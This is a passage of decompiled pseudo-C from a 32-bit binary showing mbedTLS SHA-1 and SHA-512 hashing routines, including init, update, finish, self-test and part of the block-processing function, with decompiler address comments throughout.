    int32_t v346 = 0x40000000 * v337 | v337 / 4; // 0x8053387
    int32_t v347 = v284 ^ v292 ^ v316 ^ v336; // 0x8053395
    int32_t v348 = 2 * v347 | (int32_t)(v347 < 0); // 0x805339a
    int32_t v349 = 0x40000000 * v342 | v342 / 4; // 0x80533b9
    uint32_t v350 = v348 - 0x359d3e2a + v338 + (v346 ^ v341 ^ v342) + (32 * v345 | v345 / 0x8000000); // 0x80533cb
    int32_t v351 = v296 ^ v288 ^ v320 ^ v340; // 0x80533dc
    int32_t v352 = 2 * v351 | (int32_t)(v351 < 0); // 0x80533e1
    uint32_t v353 = v352 - 0x359d3e2a + v341 + (v349 ^ v346 ^ v345) + (32 * v350 | v350 / 0x8000000); // 0x80533fc
    int32_t v354 = v292 ^ v300 ^ v324 ^ v344; // 0x8053413
    int32_t v355 = 0x40000000 * v345 | v345 / 4; // 0x8053416
    int32_t v356 = 0x40000000 * v350 | v350 / 4; // 0x805341c
    int32_t v357 = 2 * v354 | (int32_t)(v354 < 0); // 0x805341f
    uint32_t v358 = v357 - 0x359d3e2a + v346 + (v355 ^ v349 ^ v350) + (32 * v353 | v353 / 0x8000000); // 0x805343d
    int32_t v359 = v296 ^ v304 ^ v328 ^ v348; // 0x805344e
    int32_t v360 = 2 * v359 | (int32_t)(v359 < 0); // 0x8053451
    int32_t v361 = 0x40000000 * v353 | v353 / 4; // 0x805346b
    uint32_t v362 = v360 - 0x359d3e2a + v349 + (v356 ^ v355 ^ v353) + (32 * v358 | v358 / 0x8000000); // 0x8053474
    int32_t v363 = v308 ^ v300 ^ v332 ^ v352; // 0x8053488
    uint32_t v364 = (2 * v363 | (int32_t)(v363 < 0)) - 0x359d3e2a + v355 + (v361 ^ v356 ^ v358) + (32 * v362 | v362 / 0x8000000); // 0x80534a9
    int32_t v365 = 0x40000000 * v358 | v358 / 4; // 0x80534bb
    int32_t v366 = v304 ^ v312 ^ v336 ^ v357; // 0x80534c0
    int32_t v367 = (2 * v366 | (int32_t)(v366 < 0)) - 0x359d3e2a + v356 + (v365 ^ v361 ^ v362) + (32 * v364 | v364 / 0x8000000); // 0x80534e0
    int32_t v368 = v308 ^ v316 ^ v340 ^ v360; // 0x80534e5
    int32_t v369 = 0x40000000 * v362 | v362 / 4; // 0x80534ed
    *(int32_t *)(a1 + 8) = v81 - 0x359d3e2a + (2 * v368 | (int32_t)(v368 < 0)) + v361 + (v369 ^ v365 ^ v364) + (32 * v367 | v367 / 0x8000000);
    int32_t * v370 = (int32_t *)(a1 + 12); // 0x8053514_0
    *v370 = v367 + *v370;
    int32_t result = 0x40000000 * v364 | v364 / 4; // 0x8053517
    int32_t * v371 = (int32_t *)(a1 + 16); // 0x805351a_0
    *v371 = result + *v371;
    int32_t * v372 = (int32_t *)(a1 + 20); // 0x805351d_0
    *v372 = v369 + *v372;
    int32_t * v373 = (int32_t *)(a1 + 24); // 0x8053520_0
    *v373 = v365 + *v373;
    return result;
}

// Address range: 0x8053530 - 0x805354f
int32_t mbedtls_sha1_init(char * a1) {
    // 0x8053530
    memset(a1, 0, 23);
    return 0;
}

// Address range: 0x8053550 - 0x805363f
int32_t mbedtls_sha1_update(char * a1, char * a2, uint32_t a3) {
    int32_t v1 = g5; // 0x8053553
    int32_t v2 = g7; // 0x8053554
    int32_t v3 = g3; // 0x8053555
    g3 = a3;
    g7 = (int32_t)a1;
    g5 = (int32_t)a2;
    if (a3 == 0) {
        // 0x80535c4
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return g1;
    }
    uint32_t v4 = *(int32_t *)a1; // 0x8053566
    int32_t v5 = v4 % 64; // 0x805356a
    int32_t v6 = v4 + a3; // 0x805356d
    g1 = v6;
    int32_t v7 = 64 - v5; // edx
    *(int32_t *)a1 = v6;
    if (v6 < a3) {
        int32_t * v8 = (int32_t *)(g7 + 4); // 0x8053581_0
        *v8 = *v8 + 1;
        // branch -> 0x8053585
    }
    int32_t v9 = g3; // 0x8053585
    int32_t v10 = v9; // 0x8053589
    int32_t v11; // 0x80535c0
    if (v9 >= v7) {
      lab_0x80535f0:
        // 0x80535f0
        g1 = v5;
        if (v5 == 0) {
            // 0x80535f0
            v10 = g3;
            v5 = 0;
            // branch -> 0x8053589
        } else {
            int32_t v12 = g7 + 28; // 0x80535fa
            memcpy((char *)(v12 + v5), (char *)g5, v7);
            g1 = mbedtls_sha1_process(g7, (char *)v12);
            g5 += v7;
            int32_t v13 = g3 - v7; // 0x8053631
            g3 = v13;
            v10 = v13;
            v5 = 0;
            // branch -> 0x8053589
        }
        // 0x8053589
        v11 = v10;
        if (v10 >= 64) {
          lab_0x805358e:;
            int32_t v14 = 0; // 0x8053590
            mbedtls_sha1_process(g7, (char *)(g5 + v14));
            int32_t v15 = g3; // 0x80535a5
            // branch -> 0x8053590
            while (v15 - (v14 + 64) > 63) {
                // 0x8053590
                v14 += 64;
                mbedtls_sha1_process(g7, (char *)(g5 + v14));
                v15 = g3;
                // continue -> 0x8053590
            }
            uint32_t v16 = v15 - 64; // 0x80535b1
            g1 = v16 & -64;
            v11 = v16 % 64;
            // branch -> 0x80535c0
        }
      lab_0x80535c0:
        // 0x80535c0
        if (v11 != 0) {
            // 0x80535d0
            v7 = v5;
            int32_t v17 = g7; // 0x80535d9
            g3 = v3;
            g7 = v2;
            g5 = v1;
            int32_t v18;
            int32_t v19;
            memcpy((char *)v19, (char *)v18, v5 + 28 + v17);
            // branch -> 0x80535f0
            goto lab_0x80535f0;
        }
        // 0x80535c0
        // branch -> 0x80535c4
        // 0x80535c4
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return g1;
    }
    // 0x8053589
    if (v10 < 64) {
        v11 = v10;
        goto lab_0x80535c0;
    }
    goto lab_0x805358e;
}

// Address range: 0x8053640 - 0x805378f
// Used cryptographic patterns:
//  - padding_used_in_hashing_algorithms__0x80_0_____0_ (8-bit, little endian)
int32_t mbedtls_sha1_finish(int32_t * a1, char * a2) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = g5; // 0x8053643
    int32_t v3 = g7; // 0x8053644
    int32_t v4 = g3; // 0x8053645
    g3 = v1;
    g7 = (int32_t)a2;
    uint32_t v5 = *(int32_t *)(v1 + 4); // 0x805364f
    int32_t v6 = 0x1000000 * v5 / 0x200000 / 0x1000000;
    g5 = v5 / 32 % 0x1000000;
    uint32_t v7 = *a1 % 64; // 0x805369f
    int32_t v8 = (v7 < 56 ? 56 : 120) - v7;
    g1 = v8;
    mbedtls_sha1_update((char *)a1, "\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", v8);
    g1 = &v6;
    mbedtls_sha1_update((char *)g3, (char *)&v6, 8);
    *(char *)g7 = *(char *)(g3 + 11);
    *(char *)(g7 + 1) = (char)*(int16_t *)(g3 + 10);
    *(char *)(g7 + 2) = (char)(*(int32_t *)(g3 + 8) / 256);
    *(char *)(g7 + 3) = (char)*(int32_t *)(g3 + 8);
    *(char *)(g7 + 4) = *(char *)(g3 + 15);
    *(char *)(g7 + 5) = (char)*(int16_t *)(g3 + 14);
    *(char *)(g7 + 6) = (char)(*(int32_t *)(g3 + 12) / 256);
    *(char *)(g7 + 7) = (char)*(int32_t *)(g3 + 12);
    *(char *)(g7 + 8) = *(char *)(g3 + 19);
    *(char *)(g7 + 9) = (char)*(int16_t *)(g3 + 18);
    *(char *)(g7 + 10) = (char)(*(int32_t *)(g3 + 16) / 256);
    *(char *)(g7 + 11) = (char)*(int32_t *)(g3 + 16);
    *(char *)(g7 + 12) = *(char *)(g3 + 23);
    *(char *)(g7 + 13) = (char)*(int16_t *)(g3 + 22);
    *(char *)(g7 + 14) = (char)(*(int32_t *)(g3 + 20) / 256);
    *(char *)(g7 + 15) = (char)*(int32_t *)(g3 + 20);
    *(char *)(g7 + 16) = *(char *)(g3 + 27);
    *(char *)(g7 + 17) = (char)*(int16_t *)(g3 + 26);
    *(char *)(g7 + 18) = (char)(*(int32_t *)(g3 + 24) / 256);
    int32_t result = *(int32_t *)(g3 + 24); // 0x8053767
    *(char *)(g7 + 19) = (char)result;
    g3 = v4;
    g7 = v3;
    g5 = v2;
    return result;
}

// Address range: 0x8053790 - 0x805397f
int32_t mbedtls_sha1_self_test(int32_t a1) {
    int32_t v1 = g5; // 0x8053793
    int32_t v2 = g7; // 0x8053794
    int32_t v3 = g3; // 0x8053795
    int32_t v4;
    g3 = &v4;
    mbedtls_sha1_init((char *)&v4);
    int32_t str;
    int32_t v5 = &str; // 0x80537aa_0
    int32_t v6 = 0; // 0x80538d116
    char * str2 = (char *)&g25;
    char * v7 = "abc";
    // branch -> 0x80537dd
    while (true) {
        // 0x80537dd
        g5 = a1;
        if (a1 != 0) {
            // 0x80538d1
            printf("  SHA-1 test #%d: ", v6 + 1);
            // branch -> 0x80537e8
        }
        // 0x80537e8
        v4 = 0;
        if (v6 == 2) {
            // 0x80538ef
            int32_t v8;
            g5 = &v8;
            g1 = 0x61616161;
            memset((char *)&v8, 0x61616161, 250);
            g7 = 1;
            mbedtls_sha1_update((char *)g3, (char *)&v8, 1000);
            // branch -> 0x8053908
            while (g7 != 1000) {
                // 0x8053908
                g7++;
                mbedtls_sha1_update((char *)g3, (char *)&v8, 1000);
                // continue -> 0x8053908
            }
          lab_0x805384f:
            // 0x805384f
            mbedtls_sha1_finish((int32_t *)g3, (char *)&str);
            g7 = v5;
            uint32_t strncmp_rc = strncmp((char *)&str, str2, 20);
            g237 = strncmp_rc % 2 == 0;
            int32_t v9; // 0x80538bb
            if (strncmp_rc % 2 == 0) {
              lab_0x8053877:
                // 0x8053877
                if (a1 != 0) {
                    // 0x8053932
                    puts("passed");
                    // branch -> 0x8053882
                }
                int32_t v10 = v6 + 1; // 0x8053882
                if (v10 == 3) {
                    // 0x80538a4
                    g1 = 0;
                    if (a1 != 0) {
                        // 0x8053943
                        putchar(10);
                        g1 = 0;
                        // branch -> 0x80538b8
                    }
                    // 0x80538b8
                    *(char *)g3 = 0;
                    v9 = g3 + 1;
                    g3 = v9;
                    // branch -> 0x80538b8
                    while (v9 != v5) {
                        // 0x80538b8
                        *(char *)v9 = 0;
                        v9 = g3 + 1;
                        g3 = v9;
                        // continue -> 0x80538b8
                    }
                    // 0x80538c6
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    return g1;
                }
                // 0x8053882
                v6 = v10;
                str2 = (char *)((int32_t)str2 + 20);
                v7 = (char *)((int32_t)v7 + 57);
                // branch -> 0x80537dd
                continue;
            } else {
                // 0x8053956
                g1 = 1;
                if (a1 != 0) {
                    // 0x8053966
                    puts("failed");
                    g1 = 1;
                    // branch -> 0x80538b8
                }
            }
            // 0x80538b8
            *(char *)g3 = 0;
            v9 = g3 + 1;
            g3 = v9;
            // branch -> 0x80538b8
            while (v9 != v5) {
                // 0x80538b8
                *(char *)v9 = 0;
                v9 = g3 + 1;
                g3 = v9;
                // continue -> 0x80538b8
            }
            // 0x80538c6
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return g1;
        }
        int32_t v11 = *(int32_t *)(4 * v6 + (int32_t)&g24); // 0x8053835
        g1 = (int32_t)v7;
        mbedtls_sha1_update((char *)g3, v7, v11);
        // branch -> 0x805384f
        goto lab_0x805384f;
    }
}

// Address range: 0x8053980 - 0x80539ff
int32_t mbedtls_sha1(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = g3; // 0x8053983
    int32_t v2;
    int32_t v3 = &v2; // 0x8053987_0
    g3 = v3;
    mbedtls_sha1_init((char *)&v2);
    v2 = 0;
    g1 = a1;
    mbedtls_sha1_update((char *)g3, (char *)a1, a2);
    mbedtls_sha1_finish((int32_t *)g3, (char *)a3);
    g1 = v3;
    *(char *)v3 = 0;
    int32_t v4 = g1 + 1; // 0x80539f3
    g1 = v4;
    // branch -> 0x80539f0
    int32_t v5;
    while (v4 != (int32_t)&v5) {
        // 0x80539f0
        *(char *)v4 = 0;
        v4 = g1 + 1;
        g1 = v4;
        // continue -> 0x80539f0
    }
    // 0x80539fa
    g3 = v1;
    int32_t v6;
    g2 = v6;
    return g7;
}

// Address range: 0x8053a00 - 0x8053a1f
void mbedtls_sha512_free(char * a1) {
    int32_t v1 = (int32_t)a1;
    g1 = v1;
    if (a1 == NULL) {
        // 0x8053a1a
        return;
    }
    // 0x8053a0a
    g6 = v1 + 212;
    *(char *)v1 = 0;
    int32_t v2 = g1 + 1; // 0x8053a13
    g1 = v2;
    // branch -> 0x8053a10
    while (v2 != g6) {
        // 0x8053a10
        *(char *)v2 = 0;
        v2 = g1 + 1;
        g1 = v2;
        // continue -> 0x8053a10
    }
    // 0x8053a1a
    // branch -> 0x8053a1a
}

// Address range: 0x8053a20 - 0x8053a46
void mbedtls_sha512_clone(char * a1, char * a2) {
    // 0x8053a20
    g1 = (int32_t)a1;
    memcpy(a1, a2, 53);
}

// Address range: 0x8053a47 - 0x8053a4f
int32_t function_8053a47(int32_t a1) {
    // 0x8053a47
    return g7;
}

// Address range: 0x8053a50 - 0x8053b6f
int32_t mbedtls_sha512_starts(int32_t * a1, int32_t a2) {
    int32_t result = (int32_t)a1;
    g6 = a2;
    *a1 = 0;
    *(int32_t *)(result + 4) = 0;
    *(int32_t *)(result + 8) = 0;
    *(int32_t *)(result + 12) = 0;
    int32_t * v1 = (int32_t *)(result + 16); // 0x8053af0_0
    if (a2 == 0) {
        // 0x8053af0
        *v1 = -0xc4336f8;
        *(int32_t *)(result + 20) = 0x6a09e667;
        *(int32_t *)(result + 24) = -0x7b3558c5;
        *(int32_t *)(result + 28) = -0x4498517b;
        *(int32_t *)(result + 32) = -0x16b07d5;
        *(int32_t *)(result + 36) = 0x3c6ef372;
        *(int32_t *)(result + 40) = 0x5f1d36f1;
        *(int32_t *)(result + 44) = -0x5ab00ac6;
        *(int32_t *)(result + 48) = -0x52197d2f;
        *(int32_t *)(result + 52) = 0x510e527f;
        *(int32_t *)(result + 56) = 0x2b3e6c1f;
        *(int32_t *)(result + 60) = -0x64fa9774;
        *(int32_t *)(result + 64) = -0x4be4295;
        *(int32_t *)(result + 68) = 0x1f83d9ab;
        *(int32_t *)(result + 72) = 0x137e2179;
        *(int32_t *)(result + 76) = 0x5be0cd19;
        *(int32_t *)(result + 208) = g6;
        return result;
    }
    // 0x8053a78
    *v1 = -0x3efa6128;
    *(int32_t *)(result + 20) = -0x344462a3;
    *(int32_t *)(result + 24) = 0x367cd507;
    *(int32_t *)(result + 28) = 0x629a292a;
    *(int32_t *)(result + 32) = 0x3070dd17;
    *(int32_t *)(result + 36) = -0x6ea6fea6;
    *(int32_t *)(result + 40) = -0x8f1a6c7;
    *(int32_t *)(result + 44) = 0x152fecd8;
    *(int32_t *)(result + 48) = -0x3ff4cf;
    *(int32_t *)(result + 52) = 0x67332667;
    *(int32_t *)(result + 56) = 0x68581511;
    *(int32_t *)(result + 60) = -0x714bb579;
    *(int32_t *)(result + 64) = 0x64f98fa7;
    *(int32_t *)(result + 68) = -0x24f3d1f3;
    *(int32_t *)(result + 72) = -0x4105b05c;
    *(int32_t *)(result + 76) = 0x47b5481d;
    *(int32_t *)(result + 208) = g6;
    return result;
}

// Address range: 0x8053b70 - 0x805502f
// Used cryptographic patterns:
//  - Hash_constant_words_K_for_SHA_384_and_SHA_512 (64-bit, little endian)
int32_t mbedtls_sha512_process(int32_t a1, int32_t a2) {
    int32_t v1;
    int32_t v2 = &v1; // 0x8053b70_0
    int32_t v3 = a2; // 0x8053bd8
    int32_t v4 = 0; // 0x8054fe3459
    // branch -> 0x8053b90
    while (true) {
        int32_t v5 = 8 * v4; // 0x8053b9e
        int32_t v6 = 8 * v4; // 0x8053ba1
        unsigned char v7 = *(char *)(v6 + v3); // 0x8053ba1
        unsigned char v8 = *(char *)(v3 + 1 + v5); // 0x8053ba5
        unsigned char v9 = *(char *)(v3 + 7 + v5); // 0x8053baa
        unsigned char v10 = *(char *)(v3 + 2 + v5); // 0x8053bb7
        unsigned char v11 = *(char *)(v3 + 3 + v5); // 0x8053bc1
        unsigned char v12 = *(char *)(v3 + 4 + v5); // 0x8053bc8
        unsigned char v13 = *(char *)(v3 + 5 + v5); // 0x8053bd8
        unsigned char v14 = *(char *)(v3 + 6 + v5); // 0x8053bdf
        int32_t v15 = v4; // edi
        *(int32_t *)(v6 - 656 + v2) = 0x10000 * (int32_t)v13 | 0x1000000 * (int32_t)v12 | (int32_t)v9 | 256 * (int32_t)v14;
        *(int32_t *)(v2 - 652 + 8 * v15) = 256 * (int32_t)v10 | 0x10000 * (int32_t)v8 | 0x1000000 * (int32_t)v7 | (int32_t)v11;
        int32_t v16 = v15 + 1; // 0x8053c10
        if (v16 == 16) {
            // 0x8053c22
            int32_t v17;
            int32_t v18 = &v17; // 0x8053c25_0
            int32_t * v19 = (int32_t *)v18; // 0x8053c38_0
            uint32_t v20 = *v19; // 0x8053c38
            int32_t * v21 = (int32_t *)(v18 + 4); // 0x8053c3a_0
            uint32_t v22 = *v21; // 0x8053c3a
            uint32_t v23 = *(int32_t *)(v18 - 112); // 0x8053c3d
            int32_t v24 = *(int32_t *)(v18 - 108); // 0x8053c40
            uint32_t v25 = *(int32_t *)(v18 - 40) + v23; // 0x8053c43
            int32_t v26 = *(int32_t *)(v18 - 36); // 0x8053c48
            uint32_t v27 = *v19; // 0x8053c59
            uint32_t v28 = *v21; // 0x8053c61
            uint32_t v29 = *v19; // 0x8053c8e
            uint32_t v30 = *v21; // 0x8053c96
            int32_t * v31 = (int32_t *)(v18 - 104); // 0x8053cab_0
            uint32_t v32 = *v31; // 0x8053cab
            int32_t * v33 = (int32_t *)(v18 - 100); // 0x8053cbf_0
            uint32_t v34 = *v33; // 0x8053cbf
            uint32_t v35 = ((0x4000000 * v30 | v29 / 64) ^ (0x2000 * v28 | v27 / 0x80000) ^ (v22 / 0x20000000 | 8 * v20)) + v25; // 0x8053cc2
            uint32_t v36 = *v31; // 0x8053ce4
            uint32_t v37 = *v33; // 0x8053ced
            int32_t v38 = v18; // 0x8053d00
            uint32_t v39 = *(int32_t *)(v38 - 100); // 0x8053d00
            uint32_t v40 = *(int32_t *)(v38 - 104); // 0x8053d15
            uint32_t v41 = ((v40 / 128 | 0x2000000 * v39) ^ (0x80000000 * v37 | v36 / 2) ^ (0x1000000 * v34 | v32 / 256)) + v35; // 0x8053d35
            *(int32_t *)(v38 + 16) = v41;
            *(int32_t *)(v18 + 20) = (v39 / 128 ^ (v37 / 2 | 0x80000000 * v36) ^ (v34 / 256 | 0x1000000 * v32)) + (v30 / 64 ^ (v28 / 0x80000 | 0x2000 * v27) ^ (8 * v22 | v20 / 0x20000000)) + v26 + v24 + (int32_t)(v25 < v23) + (int32_t)(v35 < v25) + (int32_t)(v41 < v35);
            int32_t v42 = v18 + 8; // 0x8053d47
            // branch -> 0x8053c38
            int32_t v43;
            while (v42 != (int32_t)&v43) {
                // 0x8053c38
                v18 = v42;
                v19 = (int32_t *)v18;
                v20 = *v19;
                v21 = (int32_t *)(v18 + 4);
                v22 = *v21;
                v23 = *(int32_t *)(v18 - 112);
                v24 = *(int32_t *)(v18 - 108);
                v25 = *(int32_t *)(v18 - 40) + v23;
                v26 = *(int32_t *)(v18 - 36);
                v27 = *v19;
                v28 = *v21;
                v29 = *v19;
                v30 = *v21;
                v31 = (int32_t *)(v18 - 104);
                v32 = *v31;
                v33 = (int32_t *)(v18 - 100);
                v34 = *v33;
                v35 = ((0x4000000 * v30 | v29 / 64) ^ (0x2000 * v28 | v27 / 0x80000) ^ (v22 / 0x20000000 | 8 * v20)) + v25;
                v36 = *v31;
                v37 = *v33;
                v38 = v18;
                v39 = *(int32_t *)(v38 - 100);
                v40 = *(int32_t *)(v38 - 104);
                v41 = ((v40 / 128 | 0x2000000 * v39) ^ (0x80000000 * v37 | v36 / 2) ^ (0x1000000 * v34 | v32 / 256)) + v35;
                *(int32_t *)(v38 + 16) = v41;
                *(int32_t *)(v18 + 20) = (v39 / 128 ^ (v37 / 2 | 0x80000000 * v36) ^ (v34 / 256 | 0x1000000 * v32)) + (v30 / 64 ^ (v28 / 0x80000 | 0x2000 * v27) ^ (8 * v22 | v20 / 0x20000000)) + v26 + v24 + (int32_t)(v25 < v23) + (int32_t)(v35 < v25) + (int32_t)(v41 < v35);
                v42 = v18 + 8;
                // continue -> 0x8053c38
            }
            int32_t v44 = *(int32_t *)(a1 + 16); // 0x8053d5f
            int32_t v45 = *(int32_t *)(a1 + 20); // 0x8053d62
            int32_t v46 = *(int32_t *)(a1 + 32); // 0x8053d9d
            int32_t v47 = *(int32_t *)(a1 + 36); // 0x8053da6
            uint32_t v48 = *(int32_t *)(a1 + 52); // 0x8054fb3462
            uint32_t v49 = *(int32_t *)(a1 + 48); // 0x8054fd1461
            int32_t v50 = *(int32_t *)(a1 + 60); // 0x8054fec460
            int32_t v51 = *(int32_t *)(a1 + 56); // 0x8054fe3458
            int32_t v52 = *(int32_t *)(a1 + 44); // 0x8054fda457
            int32_t v53 = *(int32_t *)(a1 + 40); // 0x8054fc8456
            int32_t v54 = *(int32_t *)(a1 + 28); // 0x8054fbc455
            int32_t v55 = *(int32_t *)(a1 + 24); // 0x8054faa454
            uint32_t v56 = v45; // 0x8054f9b453
            uint32_t v57 = v44; // 0x8054f8f452
            int32_t v58 = *(int32_t *)(a1 + 68); // 0x8055001451
            int32_t v59 = *(int32_t *)(a1 + 64); // 0x8054ff8450
            int32_t v60 = *(int32_t *)(a1 + 76); // 0x8055013449
            int32_t v61 = *(int32_t *)(a1 + 72); // 0x805500a448
            int32_t v62 = 0; // 0x8054f78447
            int32_t v63 = 8 * v62; // 0x8053e22
            uint32_t v64 = *(int32_t *)(v2 - 656 + v63) + v61; // 0x8053e22
            int32_t v65 = *(int32_t *)(v2 - 652 + v63); // 0x8053e29
            int32_t v66 = *(int32_t *)(v63 + (int32_t)&Hash_constant_words_K_for_SHA_384_and_SHA_512_at_8078ec0); // 0x8053e30
            int32_t v67 = *(int32_t *)(v63 + (int32_t)&g27); // 0x8053e3d
            uint32_t v68 = v66 + v64; // 0x8053e56
            uint32_t v69 = v68 + ((v49 / 0x4000 | 0x40000 * v48) ^ (v49 / 0x40000 | 0x4000 * v48) ^ (0x800000 * v49 | v48 / 512)); // 0x8053ee4
            uint32_t v70 = v69 + ((v59 ^ v51) & v49 ^ v59); // 0x8053f2c
            int32_t v71 = ((v58 ^ v50) & v48 ^ v58) + ((0x40000 * v49 | v48 / 0x4000) ^ (0x4000 * v49 | v48 / 0x40000) ^ (v49 / 512 | 0x800000 * v48)) + v67 + v65 + v60 + (int32_t)(v64 < v61) + (int32_t)(v68 < v64) + (int32_t)(v69 < v68) + (int32_t)(v70 < v69); // 0x8053f44
            uint32_t v72 = v70 + v53; // 0x8053f50
            uint32_t v73 = (int32_t)(v72 < v53) + v52 + v71; // 0x8053f56
            uint32_t v74 = v46 & (v57 | v55) | v57 & v55; // 0x8053fa2
            uint32_t v75 = v74 + ((0x40000000 * v57 | v56 / 4) ^ (v57 / 0x10000000 | 16 * v56) ^ (0x2000000 * v57 | v56 / 128)); // 0x805404a
            uint32_t v76 = v75 + v70; // 0x8054068
            int32_t v77 = v76; // bp-1020
            uint32_t v78 = (v47 & (v56 | v54) | v56 & v54) + ((16 * v57 | v56 / 0x10000000) ^ (v57 / 4 | 0x40000000 * v56) ^ (v57 / 128 | 0x2000000 * v56)) + (int32_t)(v75 < v74) + v71 + (int32_t)(v76 < v75); // 0x805406e
            uint32_t v79 = *(int32_t *)(v63 - 648 + v2) + v59; // 0x8054086
            int32_t v80 = *(int32_t *)(v63 - 644 + v2); // 0x805408d
            int32_t v81 = *(int32_t *)(v63 + (int32_t)&g28); // 0x8054094
            int32_t v82 = *(int32_t *)(v63 + (int32_t)&g29); // 0x80540a1
            uint32_t v83 = v81 + v79; // 0x80540a8
            uint32_t v84 = v83 + (v72 & (v51 ^ v49) ^ v51); // 0x80540f6
            uint32_t v85 = ((0x40000 * v73 | v72 / 0x4000) ^ (0x4000 * v73 | v72 / 0x40000) ^ (v73 / 512 | 0x800000 * v72)) + v84; // 0x805419c
            int32_t v86 = v80 + v58 + (int32_t)(v79 < v59) + v82 + (int32_t)(v83 < v79) + (int32_t)(v84 < v83) + (v73 & (v50 ^ v48) ^ v50) + ((v73 / 0x4000 | 0x40000 * v72) ^ (v73 / 0x40000 | 0x4000 * v72) ^ (0x800000 * v73 | v72 / 512)) + (int32_t)(v85 < v84); // 0x80541a2
            uint32_t v87 = v85 + v46; // 0x80541b4
            uint32_t v88 = v86 + v47 + (int32_t)(v87 < v85); // 0x80541bc
            uint32_t v89 = (v76 | v57) & v55 | v76 & v57; // 0x8054200
            uint32_t v90 = ((v76 / 0x10000000 | 16 * v78) ^ (0x40000000 * v76 | v78 / 4) ^ (0x2000000 * v76 | v78 / 128)) + v89; // 0x805427c
            uint32_t v91 = v90 + v85; // 0x80542ac
            uint32_t v92 = ((16 * v76 | v78 / 0x10000000) ^ (v76 / 4 | 0x40000000 * v78) ^ (v76 / 128 | 0x2000000 * v78)) + ((v78 | v56) & v54 | v78 & v56) + (int32_t)(v90 < v89) + v86 + (int32_t)(v91 < v90); // 0x80542b2
            uint32_t v93 = *(int32_t *)(v63 - 640 + v2) + v51; // 0x80542c4
            int32_t v94 = *(int32_t *)(v63 - 636 + v2); // 0x80542cb
            int32_t v95 = *(int32_t *)(v63 + (int32_t)&g30); // 0x80542d2
            uint32_t v96 = v95 + v93; // 0x80542d2
            int32_t v97 = *(int32_t *)(v63 + (int32_t)&g31); // 0x80542d9
            uint32_t v98 = (v87 & (v72 ^ v49) ^ v49) + v96; // 0x8054316
            uint32_t v99 = ((0x40000 * v88 | v87 / 0x4000) ^ (0x4000 * v88 | v87 / 0x40000) ^ (v88 / 512 | 0x800000 * v87)) + v98; // 0x80543b6
            int32_t v100 = v94 + v50 + (int32_t)(v93 < v51) + v97 + (int32_t)(v96 < v93) + (int32_t)(v98 < v96) + (v88 & (v73 ^ v48) ^ v48) + ((v88 / 0x4000 | 0x40000 * v87) ^ (v88 / 0x40000 | 0x4000 * v87) ^ (0x800000 * v88 | v87 / 512)) + (int32_t)(v99 < v98); // 0x80543bc
            uint32_t v101 = v99 + v55; // 0x80543c2
            uint32_t v102 = v100 + v54 + (int32_t)(v101 < v55); // 0x80543c4
            int32_t v103 = v77; // 0x80543de
            uint32_t v104 = (v103 | v91) & v57 | v103 & v91; // 0x8054402
            uint32_t v105 = ((16 * v92 | v91 / 0x10000000) ^ (v92 / 4 | 0x40000000 * v91) ^ (v92 / 128 | 0x2000000 * v91)) + v104; // 0x80544a6
            uint32_t v106 = v105 + v99; // 0x80544c4
            uint32_t v107 = ((v92 / 0x10000000 | 16 * v91) ^ (0x40000000 * v92 | v91 / 4) ^ (0x2000000 * v92 | v91 / 128)) + ((v92 | v78) & v56 | v92 & v78) + (int32_t)(v105 < v104) + v100 + (int32_t)(v106 < v105); // 0x80544ca
            uint32_t v108 = *(int32_t *)(v63 - 632 + v2) + v49; // 0x80544dc
            int32_t v109 = *(int32_t *)(v63 - 628 + v2); // 0x80544e3
            int32_t v110 = *(int32_t *)(v63 + (int32_t)&g32); // 0x80544ea
            uint32_t v111 = v110 + v108; // 0x80544ea
            int32_t v112 = *(int32_t *)(v63 + (int32_t)&g33); // 0x80544f1
            uint32_t v113 = (v101 & (v87 ^ v72) ^ v72) + v111; // 0x8054534
            uint32_t v114 = ((0x4000 * v102 | v101 / 0x40000) ^ (0x40000 * v102 | v101 / 0x4000) ^ (v102 / 512 | 0x800000 * v101)) + v113; // 0x80545d4
            int32_t v115 = v109 + v48 + (int32_t)(v108 < v49) + v112 + (int32_t)(v111 < v108) + (int32_t)(v113 < v111) + (v102 & (v88 ^ v73) ^ v73) + ((v102 / 0x4000 | 0x40000 * v101) ^ (v102 / 0x40000 | 0x4000 * v101) ^ (0x800000 * v102 | v101 / 512)) + (int32_t)(v114 < v113); // 0x80545da
            uint32_t v116 = v114 + v57; // 0x80545e0
            uint32_t v117 = v115 + v56 + (int32_t)(v116 < v57); // 0x80545e2
            uint32_t v118 = (v106 | v91) & v77 | v106 & v91; // 0x8054620
            uint32_t v119 = ((16 * v107 | v106 / 0x10000000) ^ (v107 / 4 | 0x40000000 * v106) ^ (v107 / 128 | 0x2000000 * v106)) + v118; // 0x80546c4
            uint32_t v120 = v119 + v114; // 0x80546e2
            uint32_t v121 = ((v107 / 0x10000000 | 16 * v106) ^ (0x40000000 * v107 | v106 / 4) ^ (0x2000000 * v107 | v106 / 128)) + ((v107 | v92) & v78 | v107 & v92) + (int32_t)(v119 < v118) + v115 + (int32_t)(v120 < v119); // 0x80546e8
            uint32_t v122 = *(int32_t *)(v63 - 624 + v2) + v72; // 0x80546fa
            int32_t v123 = *(int32_t *)(v63 - 620 + v2); // 0x8054701
            int32_t v124 = *(int32_t *)(v63 + (int32_t)&g34); // 0x8054708
            uint32_t v125 = v124 + v122; // 0x8054708
            int32_t v126 = *(int32_t *)(v63 + (int32_t)&g35); // 0x805470f
            uint32_t v127 = (v116 & (v101 ^ v87) ^ v87) + v125; // 0x8054752
            uint32_t v128 = ((0x4000 * v117 | v116 / 0x40000) ^ (0x40000 * v117 | v116 / 0x4000) ^ (v117 / 512 | 0x800000 * v116)) + v127; // 0x80547f2
